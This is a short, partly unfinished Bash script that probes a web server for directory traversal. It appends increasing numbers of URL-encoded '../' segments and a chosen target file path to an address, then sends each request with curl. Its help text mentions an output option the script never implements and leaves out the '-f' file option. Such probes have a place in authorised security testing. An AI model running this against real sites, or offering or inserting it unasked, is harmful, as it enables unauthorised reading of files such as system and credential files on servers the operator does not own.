#!/bin/bash
while getopts i:n:f:h flag
do
	case "${flag}" in
		i) address=${OPTARG};;
		n) attempts=${OPTARG};;
		f) find=${OPTARG};;
		h | *)
			echo "./TraversalFind.sh -i http://web.address.here -n 10 \n -i Set the web address. Do NOT add a trailing / \n -n Set the number of back traversals to try \n -o Set the output file for the scan {defaults to ./TraversalFindOut.txt"
			exit 0
			;;
	esac
done

# Check to make sure attempts is a number
# https://stackoverflow.com/questions/806906/how-do-i-test-if-a-variable-is-a-number-in-bash
num_regex='^[0-9]+$'
if ! [[ $attempts =~ $num_regex ]]; then
	echo "ERROR: number of tries '$attempts' is not a number" >&2; exit 1
fi

# Setup hashes for checking HTTP responses
# TODO: Finish comparing HTTP responses
hashMismatches=0
prevHash=""
curHash=""
# Create the curl requests
echo "Using $address as address. May fail without http/s or if contains trailing '/'"
for (( i=1; $i<=$attempts; i++ ))
do
	echo "$i back-path traversals"
	webPath="$address"
	for ((pathNum=1;$pathNum<=$i;pathNum++))
	do
		webPath+="/%2e%2e"
	done
	# TODO: add checking for windows vs linux traversals
	webPath+="$find"
	echo $webPath
	curl -i $webPath
done
echo "$address $attempts";
